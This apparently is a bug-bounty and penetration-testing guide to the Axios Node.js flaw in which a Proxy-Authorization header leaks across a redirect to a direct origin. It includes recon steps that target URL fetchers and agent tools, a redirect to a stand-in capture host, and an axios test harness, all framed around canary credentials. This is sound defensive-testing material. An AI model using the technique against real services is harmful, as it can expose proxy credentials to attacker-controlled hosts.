# Axios proxy-authorization redirect boundary

## Operator value

Axios advisories [GHSA-j5f8-grm9-p9fc / CVE-2026-44486](https://github.com/advisories/GHSA-j5f8-grm9-p9fc) and [GHSA-p92q-9vqr-4j8v / CVE-2026-44487](https://github.com/advisories/GHSA-p92q-9vqr-4j8v) describe Node.js HTTP-adapter bugs where an authenticated proxy credential header can survive an automatic redirect after Axios re-evaluates the redirected request as direct/non-proxied.

For authorized testing, treat this as an outbound client and redirect-boundary check: can a URL you control cause a target service, worker, webhook fetcher, crawler, integration runner, or agent tool to disclose its `Proxy-Authorization` header to your final redirect origin?

## Affected surface

- Product: Axios / `axios`
- Ecosystem: npm
- Affected versions: `>= 1.0.0, < 1.16.0` and `<= 0.31.1`
- Fixed versions: `1.16.0` and `0.32.0`
- Required position: ability to influence a URL fetched by a Node.js process using Axios' Node HTTP adapter with automatic redirects enabled
- Required environment: authenticated proxy configuration such as `HTTP_PROXY=http://user:pass@proxy.example:8080`, with a redirect target that Axios resolves to no proxy, for example an `http://` URL redirecting to `https://` while `HTTPS_PROXY` is unset or a target excluded by `NO_PROXY`
- Not affected: browser, XHR, or fetch adapters; requests with `maxRedirects: 0`

## Recon workflow

1. Confirm scope allows outbound-callback testing and that you may operate a controlled redirect/capture endpoint.
2. Identify Node.js components that fetch attacker-influenced URLs:
   - webhook delivery testers;
   - URL previewers, crawlers, importers, or screenshot services;
   - CI, package, or artifact metadata fetchers;
   - agent tools that browse, summarize, or ingest remote URLs;
   - integration runners that call third-party APIs through corporate proxies.
3. Verify Axios and runtime details from authorized evidence: lockfiles, SBOM, container image inventory, dependency manifests, admin-provided package output, or a lab clone.
4. Determine whether the service uses authenticated proxy environment variables or Axios proxy configuration. A version match alone is not enough; the leak needs a proxy credential and redirect proxy-mode transition.
5. Map proxy rules that can create a proxied-to-direct transition, especially:
   - `HTTP_PROXY` set but `HTTPS_PROXY` unset;
   - protocol-changing redirects from `http://` to `https://`;
   - `NO_PROXY` rules that match the redirect target;
   - per-request Axios proxy overrides.

## Safe validation pattern

Use a lab clone or a production-safe canary endpoint with explicit approval. The goal is to prove header retention across redirect boundaries without collecting real credentials.

1. Configure a lab process with a canary proxy credential, never a real corporate password:

   ```bash
   export HTTP_PROXY='http://skillz-canary:proxy-boundary-canary@127.0.0.1:8080'
   unset HTTPS_PROXY
   ```

2. Prepare a controlled HTTP endpoint that returns a redirect to your controlled HTTPS endpoint:

   ```http
   HTTP/1.1 302 Found
   Location: https://capture.example.test/final
   ```

3. Trigger the target Axios fetch against the HTTP start URL. For a local lab harness:

   ```js
   import axios from "axios";

   await axios.get("http://redirector.example.test/start", {
     // Leave redirects enabled to exercise the affected path.
     maxRedirects: 5,
   });
   ```

4. Inspect only your controlled capture logs for the inert canary value:
   - **Contained:** `/final` receives no `Proxy-Authorization` header.
   - **Vulnerable boundary:** `/final` receives `Proxy-Authorization: Basic ...` containing the canary proxy credential.

5. Repeat with a fixed Axios version or `maxRedirects: 0` in the same lab to show the boundary closes.

## Targeted probes for bug-bounty workflows

When the assessed app exposes URL ingestion, use paired canary URLs rather than sensitive targets:

```text
https://capture.example.test/direct-ok
http://redirector.example.test/start-to-https-capture
```

Record whether the redirected request changes protocol, matches `NO_PROXY`, or otherwise changes from proxied to direct. Do not attempt to recover real proxy credentials; configure or request a canary credential for proof.

If you cannot observe server-side headers directly, use a unique canary username in the proxy URL and ask the program owner to confirm whether that exact marker appeared in controlled capture logs. Avoid broad blind testing that could send real credentials to third-party infrastructure.

## Evidence to capture

- Axios version and how it was verified.
- Node.js adapter path confirmation: server-side Node HTTP adapter, not browser/XHR/fetch.
- Proxy configuration class, redacted to avoid secrets; include only canary credentials if used.
- Redirect chain showing the transition from proxied initial URL to direct redirected URL.
- Minimal capture log showing presence or absence of `Proxy-Authorization` at the final origin.
- Confirmation that validation used controlled infrastructure and inert canary secrets.

## Report framing

Frame this as a stale proxy-auth header crossing an origin and proxy-mode boundary. The initial request legitimately needed `Proxy-Authorization` for the proxy, but redirect handling failed to clear the header when the final request no longer used that proxy. Impact depends on whether attacker-controlled URLs are fetched by a vulnerable Node.js Axios client that uses authenticated proxy settings and follows redirects automatically.

## Sources

- GitHub Advisory Database: [GHSA-j5f8-grm9-p9fc / CVE-2026-44486](https://github.com/advisories/GHSA-j5f8-grm9-p9fc)
- GitHub Advisory Database: [GHSA-p92q-9vqr-4j8v / CVE-2026-44487](https://github.com/advisories/GHSA-p92q-9vqr-4j8v)
- Axios project advisory: [GHSA-j5f8-grm9-p9fc](https://github.com/axios/axios/security/advisories/GHSA-j5f8-grm9-p9fc)
- Axios fix pull request: [axios/axios#10794](https://github.com/axios/axios/pull/10794)
- Axios v1 fix commit: [`afca61a070728e717203c2bc21e7b589b59b858b`](https://github.com/axios/axios/commit/afca61a070728e717203c2bc21e7b589b59b858b)
- Axios releases: [`v1.16.0`](https://github.com/axios/axios/releases/tag/v1.16.0), [`v0.32.0`](https://github.com/axios/axios/releases/tag/v0.32.0)
